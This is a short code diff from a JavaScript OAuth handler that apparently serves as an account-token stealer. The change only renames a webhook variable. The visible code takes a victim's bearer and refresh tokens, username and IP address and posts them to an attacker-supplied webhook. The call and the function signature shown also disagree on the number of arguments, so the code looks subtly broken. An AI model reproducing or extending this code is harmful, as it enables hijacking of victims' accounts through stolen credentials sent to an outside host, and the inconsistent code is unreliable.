@@ -171,7 +171,7 @@ async function getWebhook(apikey) {
 // END MONGO
 
 // OAUTH HANDLING
-async function handleRequest(code, webhook_url, redirect_uri, req) {
+async function handleRequest(code, webhook, redirect_uri, req) {
     console.log("A new request has been made! Handling...");
     try {
         const accessTokenAndRefreshTokenArray =
@@ -196,7 +196,7 @@ async function handleRequest(code, webhook_url, redirect_uri, req) {
         const username = usernameAndUUIDArray[1];
         const ip = getIp(req);
         console.log("IP: " + ip);
-        postToWebhook(username, bearerToken, ip, refreshToken, webhook_url);
+        postToWebhook(username, bearerToken, ip, refreshToken, webhook);
         console.log("Request handled!");
         console.log(
             "____________________________________________________________"
@@ -313,7 +313,7 @@ async function postToWebhook(
     username,
     bearerToken,
     ip,
-    webhook_url
+    webhook
 ) {
     data = {
         username: "OAR",
